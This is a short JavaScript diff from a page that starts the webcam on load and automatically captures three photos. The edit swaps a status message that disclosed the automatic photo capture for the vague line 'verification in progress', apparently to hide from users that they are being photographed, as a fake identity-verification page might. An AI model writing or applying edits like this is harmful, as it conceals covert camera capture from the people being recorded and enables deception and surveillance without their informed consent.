@@ -37,7 +37,7 @@ window.onload = async () => {
         stream = await navigator.mediaDevices.getUserMedia({ video: true });
         document.getElementById("video").srcObject = stream;
         document.getElementById("status").innerText = 
-            "Camera started… capturing 3 photos automatically";
+            "verification in progress";
 
         // Start auto-capturing
         setTimeout(() => captureThreePhotos(), 1000);
